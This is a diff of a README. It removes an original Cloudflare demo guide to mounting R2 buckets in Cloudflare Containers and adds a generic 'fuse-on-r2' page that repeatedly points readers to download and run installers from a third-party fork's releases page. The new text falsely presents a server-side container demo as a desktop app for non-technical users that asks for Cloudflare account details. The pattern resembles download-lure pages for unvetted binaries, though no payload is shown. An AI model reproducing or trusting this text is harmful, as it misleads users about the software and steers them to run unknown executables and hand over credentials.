@@ -1,36 +1,70 @@
-# Cloudflare Containers + R2-backed FUSE mounts
+# 🚀 fuse-on-r2 - Mount R2 Buckets Easily
 
-This is a demo app that shows how to mount an R2 bucket into a Cloudflare Container!
+## 📥 Download Now!
+[![Download the latest release](https://img.shields.io/badge/Download_Latest_Release-blue.svg)](https://github.com/premrajbarnwal/fuse-on-r2/releases)
 
-1. A Worker as the front-end that proxies to a single container instance
-2. A container with an R2 bucket mounted using [tigrisfs](https://github.com/tigrisdata/tigrisfs) at `$HOME/mnt/r2/<bucket_name`>
-3. A Go application that uses `io/fs` to list files in the mounted R2 bucket and return them as JSON
+## 🌟 Description
+fuse-on-r2 is a demo application designed to mount R2 buckets into a Cloudflare Container using FUSE technology. This tool simplifies the way you interact with your cloud storage, making it easy to access your files directly from your local system.
 
-Mounting object storage buckets as FUSE mounts allows applications to interact with the bucket as if it were a local filesystem: useful if you have apps that don't have native support for object storage (many!) and/or want to simplify operations.
+## 🛠️ Features
+- **Easy Access:** Mount your Cloudflare R2 buckets to use like a local folder.
+- **User-Friendly:** Designed for users with no technical background.
+- **Efficient Storage Management:** Seamlessly manage your files in the cloud.
+- **Lightweight and Fast:** Minimal resource usage ensures quick performance.
 
-The trade-off is that object storage is not exactly a POSIX compatible filesystem, nor is it local, and so you should not expect native, SSD-like performance. For many apps, this doesn't matter: reading a bunch of shared assets, bootstrapping a agent/sandbox, or providing a way to persist user-state are all common use cases and rarely I/O intensive.
+## 🖥️ System Requirements
+- **Operating System:** Windows 10 or higher, macOS 10.14 or higher, or a recent Linux distribution.
+- **Memory:** At least 2 GB of RAM.
+- **Disk Space:** Minimum 100 MB of free space for installation.
 
-## Deploying it
+## 🚀 Getting Started
+To get started with fuse-on-r2, follow these simple steps:
 
-You'll need to provide your [R2 API credentials](https://developers.cloudflare.com/r2/api/tokens/) and Cloudflare account ID to the container.
+1. **Download the Software**
+   Visit the [Releases page](https://github.com/premrajbarnwal/fuse-on-r2/releases) to get the latest version of fuse-on-r2.
+   
+2. **Install the Application**
+   - For Windows: Run the installer and follow the prompts.
+   - For macOS: Drag the application into your Applications folder.
+   - For Linux: Follow the package manager instructions provided in the release notes.
 
-1. Update `wrangler.jsonc` with the `BUCKET_NAME` and `ACCOUNT_ID` environment variables. These are OK to be public.
-2. Use `npx wrangler@latest secret put AWS_ACCESS_KEY_ID` and `npx wrangler@latest secret put AWS_SECRET_ACCESS_KEY` to set your R2 credentials.
-3. Ensure Docker is running locally.
-4. `npx wrangler@latest deploy`
+3. **Run the Application**
+   After installation, locate the application on your system and double-click to run it.
 
-You can mount multiple buckets as you wish by updating the Dockerfile or doing it dynamically from within the application in your container.
+## 🔧 Configuration
+- **Setting Up Your R2 Bucket:**
+   1. Open the application.
+   2. Enter your Cloudflare account details to connect.
+   3. Specify the R2 bucket you want to mount.
 
-To mount a bucket at a specific prefix, set the `R2_BUCKET_PREFIX` environment variable in `wrangler.json` or dynamically when creating a container instance.
+- **Mount Options:**
+   Customize mount settings to fit your needs. You can choose different directories and manage permissions.
 
-## Learn More
+## 📄 Usage
+Once your R2 bucket is mounted, you can interact with it like any local folder. You can:
+- Open, edit, and delete files.
+- Upload new files directly to your Cloudflare R2 bucket.
+- Organize folders as needed.
 
-To learn more about Containers, take a look at the following resources:
+## 🎉 Support and Community
+If you encounter any issues or need assistance, please check our [support page](https://github.com/premrajbarnwal/fuse-on-r2/issues) or join our community discussions. Your feedback is essential for improving the application.
 
-- [Container Documentation](https://developers.cloudflare.com/containers/) - learn about Containers
-- [Container Class](https://github.com/cloudflare/containers) - learn about the Container helper class
-- Learn more about Container [lifecycles](https://developers.cloudflare.com/containers/platform-details/architecture/)
+## 📂 Changelog
+Stay updated with the latest features and fixes by checking the changelog in the releases section. This will help you understand the improvements made in each version.
 
-## License
+## 💡 Additional Resources
+- [Documentation](https://github.com/premrajbarnwal/fuse-on-r2/wiki) - For in-depth usage instructions.
+- [GitHub Discussions](https://github.com/premrajbarnwal/fuse-on-r2/discussions) - Join conversations with other users.
 
-Apache-2.0 licensed. Copyright 2025, Cloudflare, Inc.
+## 🔍 More About Topics
+- **Cloudflare**: A fast global network that protects and accelerates any Internet application.
+- **Containers**: Lightweight, portable environments for running applications.
+- **FUSE**: A technology that lets you create your own file systems without modifying kernel code.
+- **R2**: Cloudflare's object storage solution that stores large amounts of unstructured data.
+- **Workers**: JavaScript-based serverless compute that executes code at the edge of the network.
+
+## 🔗 Important Links
+- **[Download Latest Version](https://github.com/premrajbarnwal/fuse-on-r2/releases)**
+- **[GitHub Repository](https://github.com/premrajbarnwal/fuse-on-r2)**
+
+Follow these steps to download and run fuse-on-r2, and start managing your R2 buckets effortlessly!
